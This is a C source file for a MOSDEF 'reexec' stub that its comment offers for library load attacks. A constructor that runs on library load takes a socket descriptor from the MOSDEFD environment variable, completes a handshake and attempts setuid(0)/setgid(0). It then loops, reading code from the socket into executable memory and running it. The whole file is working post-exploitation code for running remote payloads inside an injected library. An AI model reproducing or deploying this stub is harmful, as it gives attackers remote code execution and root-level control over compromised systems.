/*
    A MOSDEF reexec you can use in library load attacks

    This gets the FD from MOSDEFD environment var.
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <poll.h>
#include <sys/mman.h>

# define callptr(ptr) ((void(*)())(ptr))()

void init(void) __attribute__ ((constructor));

int
pollfd(int fd)
{
    struct pollfd fds;
    int i;

    fds.fd      = fd;
    fds.revents = 0;
    fds.events  = POLLIN;

    if ((i = poll(&fds, 1, -1)) > 0)
        return 1;
    else
        return 0;
}
    
void
init(void)
{
    char *p                 = NULL;
    int s                   = 0;
    int i                   = 0;

    if (!(p = getenv("MOSDEFD")))
    {
        perror("mosdefd");
        _exit(1);
    }

    s = atoi(p);

    printf("using fd: %d for reexec .. doing new startup\n", s);

# define BUFSIZE 0x4000
	
	p = mmap(0, BUFSIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (p == MAP_FAILED) {
		_exit(4);
	}

    // emulate mosdef handshake
    if (pollfd(s) && read(s, &i, 4) <= 0)
    {
        perror("read");
        close(s);
        munmap(p, BUFSIZE);
        _exit(1);
    }

    if (i > 0 && i < BUFSIZE && pollfd(s) && (read(s, p, i) > 0))
        printf("ignored %d mosdef bytes ..\n", i);
    else
    {
        perror("read");
        close(s);
        munmap(p, BUFSIZE);
        _exit(1);
    }

#ifdef _SOL_INTEL
	i = 0;
	write(s, &i, 4);
#endif
	
    // send fd
    write(s, &s, 4);

    // do the real thing
	setuid(0);
	setgid(0);
	
	while (1)
	{	
		int got = 0;
		
		if (pollfd(s) && read(s, &i, 4) <= 0)
		{
		    perror("read");
		    close(s);
			munmap(p, BUFSIZE);
		    _exit(1);
		}
		while(i-got)
		{
			int n = 0;
			
			if (i > 0 && i < BUFSIZE && pollfd(s) && (n = read(s, p+got, i-got)) > 0)
			    got += n;
			else
			{
			    perror("read");
			    close(s);
				munmap(p, BUFSIZE);
			    _exit(1);
			}
		}
		// the mosdef stub will most likely have hosed all registers
		// including the PIC reg ... (ebx)
		asm volatile ("pusha\n");
		callptr(p);
		asm volatile ("popa\n");
	}

    // never reached
    perror("mosdef");
}

// for testing

int
main(void)
{
    init();
	return 0;
}
